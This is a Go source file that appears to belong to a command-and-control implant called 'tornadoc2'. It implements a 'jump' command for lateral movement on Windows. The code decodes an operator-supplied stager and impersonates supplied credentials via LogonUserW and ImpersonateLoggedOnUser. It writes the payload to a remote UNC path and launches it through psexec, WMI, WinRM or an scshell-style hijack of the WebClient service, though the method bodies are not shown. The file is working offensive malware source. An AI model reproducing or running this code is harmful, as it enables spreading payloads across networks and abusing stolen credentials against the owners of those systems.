//go:build (jump_psexec || jump_winrm || jump_wmi || jump_scshell) && windows

package core

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"tornadoc2/agent/protocol"
)

var jumpImpersonate = syscall.NewLazyDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser")

type jumpSpec struct {
	Method    string
	Target    string
	Stage     []byte
	Service   string
	User      string
	Pass      string
	NoCleanup bool
	Port      int
	Timeout   int
}

func parseJump(t protocol.Task) (*jumpSpec, error) {
	if len(t.Args) < 3 {
		return nil, errors.New("usage: jump <method> <target> <stage_b64>")
	}
	s := &jumpSpec{Method: strings.ToLower(t.Args[0]),
		Target: t.Args[1], Port: 5986, Timeout: 120}
	raw, err := base64.StdEncoding.DecodeString(t.Args[2])
	if err != nil || len(raw) == 0 {
		return nil, errors.New("invalid or empty stager bytes")
	}
	s.Stage = raw
	for i := 3; i < len(t.Args); i++ {
		a := t.Args[i]
		next := func() (string, error) {
			if i+1 >= len(t.Args) {
				return "", fmt.Errorf("%s needs a value", a)
			}
			i++
			return t.Args[i], nil
		}
		switch a {
		case "--service":
			s.Service, err = next()
		case "--user":
			s.User, err = next()
		case "--pass":
			s.Pass, err = next()
		case "--port":
			var v string
			v, err = next()
			if err == nil {
				_, err = fmt.Sscanf(v, "%d", &s.Port)
			}
		case "--timeout":
			var v string
			v, err = next()
			if err == nil {
				_, err = fmt.Sscanf(v, "%d", &s.Timeout)
			}
		case "--no-cleanup":
			s.NoCleanup = true
		default:
			err = fmt.Errorf("unknown jump flag %q", a)
		}
		if err != nil {
			return nil, err
		}
	}
	if s.Target == "" {
		return nil, errors.New("target is required")
	}
	if s.Service == "" {
		if s.Method == "scshell" {
			// scshell swaps the binary path of an existing
			// service; WebClient is present by default and its
			// path is harmless to restore.
			s.Service = "WebClient"
		} else {
			s.Service = "tornadojump"
		}
	}
	return s, nil
}

func (a *Agent) jumpVerb(ctx context.Context, t protocol.Task) protocol.Result {
	spec, err := parseJump(t)
	if err != nil {
		return protocol.Result{ID: t.ID, Error: err.Error()}
	}
	if spec.User != "" {
		revert, err := logonJump(spec.User, spec.Pass)
		if err != nil {
			return protocol.Result{ID: t.ID,
				Error: "auth: " + err.Error()}
		}
		defer revert()
	}

	stageName := fmt.Sprintf("t2j_%d_%s.exe", os.Getpid(), randHex(4))
	var out string
	switch spec.Method {
	case "psexec":
		out, err = jumpPsexec(ctx, spec, stageName)
	case "scshell":
		out, err = jumpSCShell(ctx, spec, stageName)
	case "wmi":
		out, err = jumpWMI(ctx, spec, stageName)
	case "winrm":
		out, err = jumpWinRM(ctx, spec, stageName)
	default:
		err = fmt.Errorf("unknown jump method %q", spec.Method)
	}
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: fmt.Sprintf("jump %s: %v", spec.Method, err)}
	}
	return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func logonJump(user, pass string) (func(), error) {
	domain := "."
	if i := strings.IndexAny(user, `\@`); i > 0 {
		if user[i] == '\\' {
			domain, user = user[:i], user[i+1:]
		} else {
			domain, user = user[i+1:], user[:i]
		}
	}
	advapi := syscall.NewLazyDLL("advapi32.dll")
	proc := advapi.NewProc("LogonUserW")
	u, _ := syscall.UTF16PtrFromString(user)
	d, _ := syscall.UTF16PtrFromString(domain)
	p, _ := syscall.UTF16PtrFromString(pass)
	var tok syscall.Token
	const logonNewCredentials = 9
	r, _, e := proc.Call(uintptr(unsafe.Pointer(u)), uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(p)), logonNewCredentials, 0,
		uintptr(unsafe.Pointer(&tok)))
	if r == 0 {
		return nil, fmt.Errorf("LogonUser: %v", e)
	}
	r, _, e = jumpImpersonate.Call(uintptr(tok))
	if r == 0 {
		return nil, fmt.Errorf("ImpersonateLoggedOnUser: %v", e)
	}
	return func() {
		_ = windows.RevertToSelf()
		_ = tok.Close()
	}, nil
}

func writeStage(spec *jumpSpec, uncPath string) error {
	return os.WriteFile(uncPath, spec.Stage, 0600)
}
